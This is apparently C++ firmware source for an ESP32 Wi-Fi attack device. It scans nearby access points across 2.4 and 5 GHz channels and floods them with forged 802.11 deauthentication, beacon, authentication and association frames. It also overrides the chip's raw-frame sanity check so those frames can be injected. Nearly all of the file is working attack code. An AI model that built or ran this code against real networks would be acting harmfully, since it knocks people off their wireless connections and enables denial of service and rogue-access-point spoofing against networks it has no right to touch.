#include <stdint.h>
#include "pgmspace.h"
#include "esp_wifi.h"
#include "esp_wifi_types_generic.h"
#include "wifiP.h"
#include <map>
#include <vector>
#include <array>

macAddr macStore[STORE_LEN];
uint8_t macCursor = 0;

std::map<uint8_t, std::vector<BSSIDInfo>> channelAPMap;
uint8_t totalAPCount = 0;

const uint8_t nx::wifi::channelList[37] = {
  1,2,3,4,5,6,7,8,9,10,11,12,13,14,
  36,40,44,48,52,56,60,64,100,104,108,112,116,124,128,132,136,140,
  149,153,157,161,165
};

const size_t nx::wifi::channelCount = sizeof(channelList) / sizeof(channelList[0]);

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t){
  return (arg == 31337) ? 1 : 0;
}

void nx::wifi::debug_print(const char* context){
  Serial.printf("[WIFI] %s\n", context);
}

void nx::wifi::storeMac(const uint8_t* mac){
  memcpy(macStore[macCursor].addr, mac, 6);
  macCursor = (macCursor + 1) % STORE_LEN;
}

bool nx::wifi::checkedMac(const uint8_t* mac){
  for(uint8_t i = 0; i < STORE_LEN; i++) if(! memcmp(mac, macStore[i].addr, 6)) return true;
  return false;
}

void nx::wifi::clearMacStored(){
  debug_print("Stored MAC cleared");
  memset(macStore, 0, sizeof(macStore));
  macCursor = 0;
}

void nx::wifi::setBandChannel(uint8_t channel){
  if(currentChannel == channel) return;
  
  esp_wifi_set_band((channel <= 14) ? WIFI_BAND_2G : WIFI_BAND_5G);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  currentChannel = channel;
  delay(10);
}

// IEEE 802.11 deauthentication frame template with reason code 7 (Class 3 frame received from nonassociated STA)
static const uint8_t deauthFrameTemplate[26] PROGMEM = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

void nx::wifi::txDeauthFrameAll(){
  if(channelAPMap.empty()){
    debug_print("No APs to attack");
    return;
  }
  
  for(auto& entry : channelAPMap){
    uint8_t channel = entry.first;
    auto& bssids = entry.second;
    
    if(bssids.empty()) continue;
    setBandChannel(channel);
    
    for(auto& bssidInfo : bssids){
      uint8_t pkt[26];
      memcpy_P(pkt, deauthFrameTemplate, 26);
      memcpy(&pkt[10], bssidInfo.bssid.data(), 6);
      memcpy(&pkt[16], bssidInfo.bssid.data(), 6);
      
      for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    }
  }
}

void nx::wifi::txDeauthFrameChannel(uint8_t channel){
  if(channelAPMap.find(channel) == channelAPMap.end()){
    Serial.printf("[WIFI] No APs found on channel %d\n", channel);
    return;
  }
  
  auto& bssids = channelAPMap[channel];
  if(bssids.empty()) return;
  
  setBandChannel(channel);
  
  for(auto& bssidInfo :  bssids){
    uint8_t pkt[26];
    memcpy_P(pkt, deauthFrameTemplate, 26);
    memcpy(&pkt[10], bssidInfo.bssid.data(), 6);
    memcpy(&pkt[16], bssidInfo.bssid.data(), 6);
    
    for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
  }
}

void nx::wifi::txDeauthFrameBSSID(const uint8_t* bssid, uint8_t channel){
  if(bssid == nullptr){
    debug_print("Invalid BSSID");
    return;
  }
  
  setBandChannel(channel);
  
  uint8_t pkt[26];
  memcpy_P(pkt, deauthFrameTemplate, 26);
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  
  for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
}

void nx::wifi::txBeaconFrame(const char* ssid, uint8_t channel, const uint8_t* bssid, bool encrypted){
  if(ssid == nullptr || bssid == nullptr) return;
  
  uint8_t ssidLen = strlen(ssid);
  if(ssidLen > 32) ssidLen = 32;
  // Open:       0x0401 (ESS, Short Preamble)
  // Encrypted: 0x0411 (ESS, Short Preamble, Privacy)
  static const uint8_t beaconTemplateOpen[38] PROGMEM = {
    0x80, 0x00,                          // Frame Control
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID) - will be replaced
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID - will be replaced
    0x00, 0x00,                          // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                          // Beacon interval
    0x01, 0x04                           // Capability (Open)
  };
  
  static const uint8_t beaconTemplateEncrypted[38] PROGMEM = {
    0x80, 0x00,                          // Frame Control
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                          // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                          // Beacon interval
    0x11, 0x04                           // Capability (Privacy bit set)
  };
  
  uint8_t pkt[128];
  
  if(encrypted) memcpy_P(pkt, beaconTemplateEncrypted, 38);
  else memcpy_P(pkt, beaconTemplateOpen, 38);

  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  int idx = 38;
  pkt[idx++] = 0x00;
  pkt[idx++] = ssidLen;
  memcpy(&pkt[idx], ssid, ssidLen);
  idx += ssidLen;

  static const uint8_t rates[10] PROGMEM = {
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
  };
  memcpy_P(&pkt[idx], rates, 10);
  idx += 10;
  
  // DS Parameter (channel)
  pkt[idx++] = 0x03;
  pkt[idx++] = 0x01;
  pkt[idx++] = channel;
  
  if(encrypted){
    // RSN Information Element (WPA2)
    static const uint8_t rsnInfo[26] PROGMEM = {
      0x30, 0x18,                    // Tag:  RSN, Length: 24
      0x01, 0x00,                    // Version: 1
      0x00, 0x0F, 0xAC, 0x04,       // Group Cipher: CCMP (AES)
      0x01, 0x00,                    // Pairwise Cipher Count: 1
      0x00, 0x0F, 0xAC, 0x04,       // Pairwise Cipher: CCMP (AES)
      0x01, 0x00,                    // AKM Suite Count: 1
      0x00, 0x0F, 0xAC, 0x02,       // AKM Suite:  PSK
      0x00, 0x00                     // RSN Capabilities
    };
    memcpy_P(&pkt[idx], rsnInfo, 26);
    idx += 26;
  }
  
  setBandChannel(channel);
  
  for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, idx, false);
}

// Authentication frame templates for 2.4GHz and 5GHz bands - shared across auth functions
static const uint8_t authTemplate2G[30] PROGMEM = {
  0xB0, 0x00,                          // Frame Control 
  0x3A, 0x01,                          // Duration
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                          // Sequence
  0x00, 0x00,                          // Auth algorithm (Open System)
  0x01, 0x00,                          // Auth sequence
  0x00, 0x00                           // Status code
};

static const uint8_t authTemplate5G[30] PROGMEM = {
  0xB0, 0x00,                          // Frame Control
  0x3A, 0x01,                          // Duration
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                          // Sequence
  0x00, 0x00,                          // Auth algorithm (Open System)
  0x01, 0x00,                          // Auth sequence
  0x00, 0x00                           // Status code
};

// HT Capabilities - shared across auth and assoc functions
static const uint8_t htCapabilities[28] PROGMEM = {
  0x2D, 0x1A,                          // Tag:  HT Capabilities, Length: 26
  0xEF, 0x09,                          // HT Capabilities Info
  0x17,                                 // A-MPDU Parameters
  0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MCS Set
  0x00, 0x00,                          // HT Extended Capabilities
  0x00, 0x00, 0x00, 0x00,             // Transmit Beamforming
  0x00                                 // ASEL Capabilities
};

void nx::wifi::txAuthFrame(const uint8_t* bssid, uint8_t channel){
  if(bssid == nullptr) return;
  
  bool is5GHz = (channel > 14);
  
  uint8_t pkt[128];
  int pktLen;
  
  uint8_t clientMAC[6];
  for(int i = 0; i < 6; i++) clientMAC[i] = random(0, 256);
  clientMAC[0] &= 0xFE;
  
  if(is5GHz){
    memcpy_P(pkt, authTemplate5G, 30);
    memcpy(&pkt[4], bssid, 6);
    memcpy(&pkt[10], clientMAC, 6);
    memcpy(&pkt[16], bssid, 6);
    
    // Add HT Capabilities
    memcpy_P(&pkt[30], htCapabilities, 28);
    pktLen = 58;
  } else {
    memcpy_P(pkt, authTemplate2G, 30);
    memcpy(&pkt[4], bssid, 6);
    memcpy(&pkt[10], clientMAC, 6);
    memcpy(&pkt[16], bssid, 6);
    pktLen = 30;
  }
  
  setBandChannel(channel);
  
  for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, pktLen, false);
}

void nx::wifi::txAuthFlood(){
  if(channelAPMap.empty()) return;
  
  for(auto& entry : channelAPMap){
    uint8_t channel = entry.first;
    for(auto& bssidInfo : entry.second) txAuthFrame(bssidInfo.bssid.data(), channel);
  }
}

// Association request frame templates for 2.4GHz and 5GHz bands - shared
static const uint8_t assocTemplate2G[28] PROGMEM = {
  0x00, 0x00,                          // Frame Control
  0x3A, 0x01,                          // Duration
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                          // Sequence
  0x01, 0x04,                          // Capability (ESS)
  0x0A, 0x00                           // Listen interval
};

static const uint8_t assocTemplate5G[28] PROGMEM = {
  0x00, 0x00,                          // Frame Control
  0x3A, 0x01,                          // Duration
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                          // Sequence
  0x01, 0x04,                          // Capability
  0x0A, 0x00                           // Listen interval
};

// Supported rates
static const uint8_t rates2G[10] PROGMEM = {
  0x01, 0x08,                          // Tag: Supported Rates, Length: 8
  0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
};

static const uint8_t rates5G[10] PROGMEM = {
  0x01, 0x08,                          // Tag: Supported Rates, Length: 8
  0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C
};

// VHT Capabilities for 5GHz 
static const uint8_t vhtCapabilities[14] PROGMEM = {
  0xBF, 0x0C,                          // Tag: VHT Capabilities, Length: 12
  0x32, 0x00, 0x80, 0x03,             // VHT Capabilities Info
  0xFA, 0xFF, 0x00, 0x00,             // Supported MCS Set
  0xFA, 0xFF, 0x00, 0x00              // Supported MCS Set 
};

static const uint8_t extCapabilities[10] PROGMEM = {
  0x7F, 0x08,                          // Tag: Extended Capabilities, Length: 8
  0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};

void nx::wifi::txAssocFrame(const uint8_t* bssid, const char* ssid, uint8_t channel){
  if(bssid == nullptr || ssid == nullptr) return;
  
  uint8_t ssidLen = strlen(ssid);
  if(ssidLen > 32) ssidLen = 32;
  
  bool is5GHz = (channel > 14);
  
  uint8_t pkt[256];
  int idx;
  
  uint8_t clientMAC[6];
  for(int i = 0; i < 6; i++) clientMAC[i] = random(0, 256);
  clientMAC[0] &= 0xFE;
  
  if(is5GHz){
    memcpy_P(pkt, assocTemplate5G, 28);
    idx = 28;
  } else {
    memcpy_P(pkt, assocTemplate2G, 28);
    idx = 28;
  }

  memcpy(&pkt[4], bssid, 6);
  memcpy(&pkt[10], clientMAC, 6);
  memcpy(&pkt[16], bssid, 6);

  pkt[idx++] = 0x00;
  pkt[idx++] = ssidLen;
  memcpy(&pkt[idx], ssid, ssidLen);
  idx += ssidLen;
  
  // Supported Rates
  if(is5GHz){
    memcpy_P(&pkt[idx], rates5G, 10);
  } else {
    memcpy_P(&pkt[idx], rates2G, 10);
  }
  idx += 10;
  
  if(is5GHz){
    pkt[idx++] = 0x32;  // Tag:  Extended Supported Rates
    pkt[idx++] = 0x04;  // Length
    pkt[idx++] = 0x30;  // 24 Mbps
    pkt[idx++] = 0x48;  // 36 Mbps
    pkt[idx++] = 0x60;  // 48 Mbps
    pkt[idx++] = 0x6C;  // 54 Mbps
  }
  
  // HT Capabilities
  memcpy_P(&pkt[idx], htCapabilities, 28);
  idx += 28;
  
  // VHT Capabilities
  if(is5GHz){
    memcpy_P(&pkt[idx], vhtCapabilities, 14);
    idx += 14;
  }
  
  memcpy_P(&pkt[idx], extCapabilities, 10);
  idx += 10;
  
  setBandChannel(channel);
  
  for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, idx, false);
}

void nx::wifi::txAssocFlood(){
  if(channelAPMap.empty()) return;
  
  for(auto& entry : channelAPMap){
    uint8_t channel = entry.first;
    for(auto& bssidInfo : entry.second){
      const char* ssid = bssidInfo.ssid.empty() ? "Network" : bssidInfo.ssid.c_str();
      txAssocFrame(bssidInfo.bssid.data(), ssid, channel);
    }
  }
}

void nx::wifi::init(){
  WiFi.mode(WIFI_MODE_NULL);
  delay(100);
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  delay(100);
  currentChannel = 0;
  debug_print("WiFi init success");
}

void nx::wifi::processScanResults(int scanCount, uint8_t channel, int& totalScan, bool verbose) {
  if(scanCount <= 0) return;
  
  for(int i = 0; i < scanCount; i++){
    const uint8_t* bssid = WiFi.BSSID(i);
    String ssid = WiFi.SSID(i);
    wifi_auth_mode_t authMode = WiFi.encryptionType(i);
    bool encrypted = (authMode != WIFI_AUTH_OPEN);
    
    BSSIDInfo newBSSID(bssid, ssid.c_str(), encrypted);
    
    bool duplicate = false;
    if(channelAPMap.find(channel) != channelAPMap.end()){
      for(auto& stored : channelAPMap[channel]){
        if(stored == newBSSID){
          duplicate = true;
          break;
        }
      }
    }
    
    if(!duplicate){
      channelAPMap[channel].push_back(newBSSID);
      totalAPCount++;
      
      if(verbose){
        Serial.printf("[WIFI] Ch %d:  %s (%02X:%02X:%02X:%02X:%02X:%02X) %s\n", 
                      channel, 
                      newBSSID.ssid.empty() ? "<Hidden>" : newBSSID.ssid.c_str(),
                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                      encrypted ? "[ENC]" : "[OPEN]");
      }
    }
  }
  totalScan += scanCount;
}

int nx::wifi::scanNetwork(bool all, uint8_t channel){
  WiFi.scanDelete();
  int totalScan = 0;
  
  if(all || channel == 0){
    channelAPMap.clear();
    totalAPCount = 0;
  }
  
  if(! all && channel != 0){
    setBandChannel(channel);
    int scan = WiFi.scanNetworks(false, true, false, 500, channel);
    processScanResults(scan, channel, totalScan, true);
  }
  else{
    for(size_t i = 0; i < channelCount; i++){
      uint8_t ch = channelList[i];
      setBandChannel(ch);
      int scan = WiFi.scanNetworks(false, true, false, 500, ch);
      processScanResults(scan, ch, totalScan, false);
    }
  }
  
  return totalScan;
}

void nx::wifi::performProgressiveScan(){
  if(channelIndex == 0 && millis() - lastScan > scanInterval){
    channelAPMap.clear();
    totalAPCount = 0;
  }
  
  if(millis() - lastScan > scanInterval){
    uint8_t channel = channelList[channelIndex];
    scanNetwork(false, channel);
    
    channelIndex = (channelIndex + 1) % channelCount;
    lastScan = millis();
    
    if(channelIndex == 0){
      scanComplete = true;
    }
  }
}
